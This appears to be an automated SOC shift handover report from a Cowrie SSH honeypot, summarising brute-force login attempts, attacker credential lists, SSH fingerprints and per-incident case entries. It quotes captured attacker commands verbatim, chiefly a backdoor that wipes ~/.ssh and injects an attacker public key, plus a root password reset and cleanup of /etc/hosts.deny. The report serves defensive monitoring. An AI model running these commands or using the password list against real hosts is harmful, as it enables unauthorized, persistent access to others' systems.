# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-02 |
| **Generated At** | 2026-06-02T10:43:43Z |
| **Shift Time** | 10:43 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **999** |
| Confirmed Threats | **978** |
| False Positives Filtered | **21** (2.1%) |
| Unique Attacker IPs | **77** |
| Countries of Origin | **31** |
| High Severity Cases | **175** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **824** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **476** |
| Unique Credential Pairs | **289** |
| Unique Usernames | **187** |
| Unique Passwords | **230** |
| Successful Auth Pairs | **114** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 175 |
| `345gs5662d34` | 85 |
| `admin` | 8 |
| `ubuntu` | 6 |
| `gitlab` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 86 |
| `345gs5662d34` | 85 |
| `123456` | 38 |
| `123` | 12 |
| `1234` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 86 |
| `345gs5662d34` | `345gs5662d34` | 85 |
| `bps` | `123456` | 3 |
| `root` | `Aa520520` | 2 |
| `root` | `Jc123456` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1qaz!QAZ123` | `39.171.240.69` | 2026-06-02T04:52:34 |
| `root` | `3245gs5662d34` | `39.171.240.69` | 2026-06-02T04:52:38 |
| `root` | `Aa123456...` | `103.41.247.76` | 2026-06-02T04:52:56 |
| `root` | `3245gs5662d34` | `103.41.247.76` | 2026-06-02T04:52:59 |
| `root` | `Aa520520` | `43.157.163.155` | 2026-06-02T04:55:59 |
| `root` | `3245gs5662d34` | `43.157.163.155` | 2026-06-02T04:56:07 |
| `root` | `Jc123456` | `131.196.14.35` | 2026-06-02T05:00:43 |
| `root` | `media123` | `211.228.218.47` | 2026-06-02T05:00:48 |
| `root` | `3245gs5662d34` | `131.196.14.35` | 2026-06-02T05:00:50 |
| `root` | `3245gs5662d34` | `211.228.218.47` | 2026-06-02T05:00:52 |
| `root` | `@Bismillah123` | `103.237.144.204` | 2026-06-02T05:02:34 |
| `root` | `3245gs5662d34` | `103.237.144.204` | 2026-06-02T05:02:38 |
| `root` | `Aa123123123` | `180.178.94.214` | 2026-06-02T05:02:46 |
| `root` | `1w3r5y7i9p` | `103.190.214.241` | 2026-06-02T05:02:46 |
| `root` | `3245gs5662d34` | `103.190.214.241` | 2026-06-02T05:02:48 |
| `root` | `3245gs5662d34` | `180.178.94.214` | 2026-06-02T05:02:50 |
| `root` | `P@ssw0rd2` | `180.178.94.214` | 2026-06-02T05:04:35 |
| `root` | `123qwe123qwe` | `103.190.214.241` | 2026-06-02T05:06:21 |
| `root` | `10203040` | `103.190.214.241` | 2026-06-02T05:09:53 |
| `root` | `1qa@WS3ed` | `202.184.134.88` | 2026-06-02T05:44:20 |
| `root` | `3245gs5662d34` | `202.184.134.88` | 2026-06-02T05:44:23 |
| `root` | `zaq12wsx` | `182.191.77.164` | 2026-06-02T05:45:11 |
| `root` | `3245gs5662d34` | `182.191.77.164` | 2026-06-02T05:45:13 |
| `root` | `Server@2022` | `103.190.214.241` | 2026-06-02T05:47:48 |
| `root` | `1qaz@WSX!` | `103.237.144.204` | 2026-06-02T05:48:51 |
| `root` | `zzzz1111` | `103.237.144.204` | 2026-06-02T05:50:43 |
| `root` | `123@abc` | `103.190.214.241` | 2026-06-02T05:56:25 |
| `root` | `Aa520520` | `103.237.144.204` | 2026-06-02T05:56:33 |
| `root` | `Jc123456` | `103.237.144.204` | 2026-06-02T05:58:27 |
| `root` | `P@ssw0rd2` | `103.237.144.204` | 2026-06-02T06:00:24 |
| `root` | `Aa123123123` | `103.237.144.204` | 2026-06-02T06:02:21 |
| `root` | `12345asd` | `59.36.78.66` | 2026-06-02T07:00:26 |
| `root` | `3245gs5662d34` | `59.36.78.66` | 2026-06-02T07:00:31 |
| `root` | `QAZ@wsx` | `190.244.39.224` | 2026-06-02T07:01:22 |
| `root` | `3245gs5662d34` | `190.244.39.224` | 2026-06-02T07:01:30 |
| `root` | `@aA123456` | `190.244.39.224` | 2026-06-02T07:04:27 |
| `root` | `a12345678` | `45.120.115.150` | 2026-06-02T07:08:08 |
| `root` | `3245gs5662d34` | `45.120.115.150` | 2026-06-02T07:08:10 |
| `root` | `qwertyqwerty` | `45.120.115.150` | 2026-06-02T07:09:52 |
| `root` | `qwer123456.` | `190.244.39.224` | 2026-06-02T07:10:30 |
| `root` | `Originalcox!@#` | `190.244.39.224` | 2026-06-02T07:13:34 |
| `root` | `Ld123456.` | `45.120.115.150` | 2026-06-02T07:15:00 |
| `root` | `Azerty123@` | `190.244.39.224` | 2026-06-02T07:16:34 |
| `root` | `amir1234` | `45.120.115.150` | 2026-06-02T07:20:00 |
| `root` | `Pass.123` | `172.203.134.70` | 2026-06-02T07:23:39 |
| `root` | `3245gs5662d34` | `172.203.134.70` | 2026-06-02T07:23:45 |
| `root` | `Q1W2E3R4` | `180.100.217.164` | 2026-06-02T07:26:58 |
| `root` | `3245gs5662d34` | `180.100.217.164` | 2026-06-02T07:27:10 |
| `root` | `12300` | `45.120.115.150` | 2026-06-02T07:28:27 |
| `root` | `1q2w3e4r#` | `172.203.134.70` | 2026-06-02T07:30:27 |
| `root` | `Root@111` | `190.244.39.224` | 2026-06-02T07:31:33 |
| `root` | `unix` | `45.120.115.150` | 2026-06-02T07:39:59 |
| `root` | `P@ssw0rd#2022` | `45.120.115.150` | 2026-06-02T07:45:02 |
| `root` | `369852` | `180.100.217.164` | 2026-06-02T07:45:56 |
| `root` | `Root123..` | `45.120.115.150` | 2026-06-02T07:52:54 |
| `root` | `123123123123` | `45.120.115.150` | 2026-06-02T07:54:35 |
| `root` | `M()nsterK!11` | `172.203.134.70` | 2026-06-02T08:09:59 |
| `root` | `qwerty1` | `172.203.134.70` | 2026-06-02T08:13:13 |
| `root` | `pakistan` | `212.87.199.64` | 2026-06-02T08:15:21 |
| `root` | `3245gs5662d34` | `212.87.199.64` | 2026-06-02T08:15:26 |
| `root` | `Administrator2` | `172.203.134.70` | 2026-06-02T08:19:47 |
| `root` | `5662` | `172.203.134.70` | 2026-06-02T08:23:04 |
| `root` | `abc123!@#` | `172.203.134.70` | 2026-06-02T08:26:23 |
| `root` | `qq@123456` | `128.78.143.196` | 2026-06-02T08:33:06 |
| `root` | `3245gs5662d34` | `128.78.143.196` | 2026-06-02T08:33:10 |
| `root` | `Yc@123456` | `172.203.134.70` | 2026-06-02T08:36:34 |
| `root` | `dev123456` | `172.203.134.70` | 2026-06-02T08:49:56 |
| `root` | `xX@123456` | `103.69.96.120` | 2026-06-02T09:07:57 |
| `root` | `3245gs5662d34` | `103.69.96.120` | 2026-06-02T09:08:05 |
| `root` | `Yy@123456` | `152.32.189.59` | 2026-06-02T09:20:14 |
| `root` | `3245gs5662d34` | `152.32.189.59` | 2026-06-02T09:20:17 |
| `root` | `nas` | `152.32.189.59` | 2026-06-02T09:29:22 |
| `root` | `@Aa11223344` | `152.32.189.59` | 2026-06-02T09:32:32 |
| `root` | `adminlinux` | `181.115.208.189` | 2026-06-02T09:38:25 |
| `root` | `3245gs5662d34` | `181.115.208.189` | 2026-06-02T09:38:33 |
| `root` | `!QAZ2wsx3` | `187.210.77.100` | 2026-06-02T09:43:43 |
| `root` | `3245gs5662d34` | `187.210.77.100` | 2026-06-02T09:43:52 |
| `root` | `bismillah` | `38.22.170.10` | 2026-06-02T09:45:01 |
| `root` | `3245gs5662d34` | `38.22.170.10` | 2026-06-02T09:45:07 |
| `root` | `abc2024` | `152.32.189.59` | 2026-06-02T09:49:12 |
| `root` | `112233445566` | `152.32.189.59` | 2026-06-02T09:52:15 |
| `root` | `1Password@` | `212.199.105.109` | 2026-06-02T09:53:10 |
| `root` | `3245gs5662d34` | `212.199.105.109` | 2026-06-02T09:53:15 |
| `root` | `A123456.` | `212.199.105.109` | 2026-06-02T09:54:39 |
| `root` | `ZAQ!2wsx2025@` | `152.32.189.59` | 2026-06-02T09:58:16 |
| `root` | `Ab123456+` | `212.199.105.109` | 2026-06-02T09:59:03 |
| `root` | `tiger@123` | `152.32.189.59` | 2026-06-02T09:59:48 |
| `root` | `123456Ko` | `212.199.105.109` | 2026-06-02T10:00:29 |
| `root` | `qwert12345` | `212.199.105.109` | 2026-06-02T10:03:24 |
| `root` | `sshd` | `183.91.11.36` | 2026-06-02T10:03:33 |
| `root` | `3245gs5662d34` | `183.91.11.36` | 2026-06-02T10:03:38 |
| `root` | `111111Aa` | `212.199.105.109` | 2026-06-02T10:04:56 |
| `root` | `woshishabi` | `212.199.105.109` | 2026-06-02T10:07:57 |
| `root` | `test2024` | `183.91.11.36` | 2026-06-02T10:08:54 |
| `root` | `!QAZ2wsx3` | `212.199.105.109` | 2026-06-02T10:09:29 |
| `root` | `abc123456abc` | `183.91.11.36` | 2026-06-02T10:10:44 |
| `root` | `qaz123456` | `103.14.33.174` | 2026-06-02T10:10:49 |
| `root` | `3245gs5662d34` | `103.14.33.174` | 2026-06-02T10:10:52 |
| `root` | `P2ssw0rd` | `103.14.33.174` | 2026-06-02T10:12:23 |
| `root` | `asdfghjkl` | `183.91.11.36` | 2026-06-02T10:12:30 |
| `root` | `root11` | `103.14.33.174` | 2026-06-02T10:15:27 |
| `root` | `Password22` | `103.14.33.174` | 2026-06-02T10:16:59 |
| `root` | `abc123.` | `103.14.33.174` | 2026-06-02T10:18:30 |
| `root` | `123ABCdef*` | `212.199.105.109` | 2026-06-02T10:21:12 |
| `root` | `l123456.` | `103.14.33.174` | 2026-06-02T10:21:43 |
| `root` | `deftones` | `212.199.105.109` | 2026-06-02T10:22:48 |
| `root` | `Pa55W0rd` | `103.14.33.174` | 2026-06-02T10:23:20 |
| `root` | `P@ssw0rd!123` | `183.91.11.36` | 2026-06-02T10:24:52 |
| `root` | `Zd123456` | `103.14.33.174` | 2026-06-02T10:26:23 |
| `root` | `QWE123QWE` | `212.199.105.109` | 2026-06-02T10:27:13 |
| `root` | `bismillah` | `183.91.11.36` | 2026-06-02T10:28:21 |
| `root` | `qazwsx111` | `212.199.105.109` | 2026-06-02T10:34:30 |
| `root` | `foobar123` | `183.91.11.36` | 2026-06-02T10:37:00 |
| `root` | `Deneme123` | `183.91.11.36` | 2026-06-02T10:40:30 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **999** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 530 |
| Go SSH scanner | 4 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 443 | 31 |
| `03a80b21afa8...` | Modern SSH client | 70 | 8 |
| `e54ef3ec27fe...` | Generic scanner | 2 | 2 |
| `17a5327c6d98...` | Mirai/variant | 1 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 443 | 31 | Mirai/variant |
| `03a80b21afa8...` | libssh | 70 | 8 | Modern SSH client |
| `95420f9d932d...` | libssh | 17 | 5 | — |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `17a5327c6d98...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 86 | 25 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:ulLOuPRTqGid"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `172.203.134.70`, `180.100.217.164`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `190.244.39.224`, `39.171.240.69`, `181.115.208.189`, `103.237.144.204`, `103.14.33.174`, `103.41.247.76`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **77** |
| Unique ASNs | **57** |
| High-Risk ASNs | **51** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS25369` | Hydra Communications Ltd | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (175)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-605aa3678dd8

| Field | Detail |
|---|---|
| **Source IP** | `39.171.240[.]69` |
| **First Seen** | 2026-06-02 04:52 |
| **Last Seen** | 2026-06-02 04:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 04:52:33` | `cowrie.session.connect` |
| `2026-06-02 04:52:33` | `cowrie.client.version` |
| `2026-06-02 04:52:33` | `cowrie.client.kex` |
| `2026-06-02 04:52:34` | `cowrie.login.success` |
| `2026-06-02 04:52:34` | `cowrie.session.params` |
| `2026-06-02 04:52:34` | `cowrie.command.input` |
| `2026-06-02 04:52:34` | `cowrie.command.failed` |
| `2026-06-02 04:52:34` | `cowrie.log.closed` |
| `2026-06-02 04:52:35` | `cowrie.session.params` |
| `2026-06-02 04:52:35` | `cowrie.command.input` |
| `2026-06-02 04:52:35` | `cowrie.session.file_download` |
| `2026-06-02 04:52:35` | `cowrie.log.closed` |
| `2026-06-02 04:52:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.171.240[.]69` to AbuseIPDB if not already reported
- [ ] Block `39.171.240[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c16610cfcb6

| Field | Detail |
|---|---|
| **Source IP** | `39.171.240[.]69` |
| **First Seen** | 2026-06-02 04:52 |
| **Last Seen** | 2026-06-02 04:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 04:52:37` | `cowrie.session.connect` |
| `2026-06-02 04:52:37` | `cowrie.client.version` |
| `2026-06-02 04:52:37` | `cowrie.client.kex` |
| `2026-06-02 04:52:38` | `cowrie.login.success` |
| `2026-06-02 04:52:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.171.240[.]69` to AbuseIPDB if not already reported
- [ ] Block `39.171.240[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec3d6ea683f5

| Field | Detail |
|---|---|
| **Source IP** | `103.41.247[.]76` |
| **First Seen** | 2026-06-02 04:52 |
| **Last Seen** | 2026-06-02 04:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 04:52:56` | `cowrie.session.connect` |
| `2026-06-02 04:52:56` | `cowrie.client.version` |
| `2026-06-02 04:52:56` | `cowrie.client.kex` |
| `2026-06-02 04:52:56` | `cowrie.login.success` |
| `2026-06-02 04:52:56` | `cowrie.session.params` |
| `2026-06-02 04:52:56` | `cowrie.command.input` |
| `2026-06-02 04:52:56` | `cowrie.command.failed` |
| `2026-06-02 04:52:56` | `cowrie.log.closed` |
| `2026-06-02 04:52:57` | `cowrie.session.params` |
| `2026-06-02 04:52:57` | `cowrie.command.input` |
| `2026-06-02 04:52:57` | `cowrie.session.file_download` |
| `2026-06-02 04:52:57` | `cowrie.log.closed` |
| `2026-06-02 04:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.41.247[.]76` to AbuseIPDB if not already reported
- [ ] Block `103.41.247[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b3772d09a71

| Field | Detail |
|---|---|
| **Source IP** | `103.41.247[.]76` |
| **First Seen** | 2026-06-02 04:52 |
| **Last Seen** | 2026-06-02 04:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 04:52:58` | `cowrie.session.connect` |
| `2026-06-02 04:52:58` | `cowrie.client.version` |
| `2026-06-02 04:52:58` | `cowrie.client.kex` |
| `2026-06-02 04:52:59` | `cowrie.login.success` |
| `2026-06-02 04:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.41.247[.]76` to AbuseIPDB if not already reported
- [ ] Block `103.41.247[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b46fedd83670

| Field | Detail |
|---|---|
| **Source IP** | `43.157.163[.]155` |
| **First Seen** | 2026-06-02 04:55 |
| **Last Seen** | 2026-06-02 04:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 04:55:57` | `cowrie.session.connect` |
| `2026-06-02 04:55:57` | `cowrie.client.version` |
| `2026-06-02 04:55:57` | `cowrie.client.kex` |
| `2026-06-02 04:55:59` | `cowrie.login.success` |
| `2026-06-02 04:56:00` | `cowrie.session.params` |
| `2026-06-02 04:56:00` | `cowrie.command.input` |
| `2026-06-02 04:56:00` | `cowrie.command.failed` |
| `2026-06-02 04:56:00` | `cowrie.log.closed` |
| `2026-06-02 04:56:01` | `cowrie.session.params` |
| `2026-06-02 04:56:01` | `cowrie.command.input` |
| `2026-06-02 04:56:01` | `cowrie.session.file_download` |
| `2026-06-02 04:56:01` | `cowrie.log.closed` |
| `2026-06-02 04:56:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.157.163[.]155` to AbuseIPDB if not already reported
- [ ] Block `43.157.163[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a6fc9679a17

| Field | Detail |
|---|---|
| **Source IP** | `43.157.163[.]155` |
| **First Seen** | 2026-06-02 04:56 |
| **Last Seen** | 2026-06-02 04:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 04:56:05` | `cowrie.session.connect` |
| `2026-06-02 04:56:05` | `cowrie.client.version` |
| `2026-06-02 04:56:06` | `cowrie.client.kex` |
| `2026-06-02 04:56:07` | `cowrie.login.success` |
| `2026-06-02 04:56:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.157.163[.]155` to AbuseIPDB if not already reported
- [ ] Block `43.157.163[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7057b8600438

| Field | Detail |
|---|---|
| **Source IP** | `131.196.14[.]35` |
| **First Seen** | 2026-06-02 05:00 |
| **Last Seen** | 2026-06-02 05:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:00:42` | `cowrie.session.connect` |
| `2026-06-02 05:00:42` | `cowrie.client.version` |
| `2026-06-02 05:00:42` | `cowrie.client.kex` |
| `2026-06-02 05:00:43` | `cowrie.login.success` |
| `2026-06-02 05:00:44` | `cowrie.session.params` |
| `2026-06-02 05:00:44` | `cowrie.command.input` |
| `2026-06-02 05:00:44` | `cowrie.command.failed` |
| `2026-06-02 05:00:45` | `cowrie.log.closed` |
| `2026-06-02 05:00:45` | `cowrie.session.params` |
| `2026-06-02 05:00:45` | `cowrie.command.input` |
| `2026-06-02 05:00:45` | `cowrie.session.file_download` |
| `2026-06-02 05:00:45` | `cowrie.log.closed` |
| `2026-06-02 05:00:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.196.14[.]35` to AbuseIPDB if not already reported
- [ ] Block `131.196.14[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c14f3115282

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-02 05:00 |
| **Last Seen** | 2026-06-02 05:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
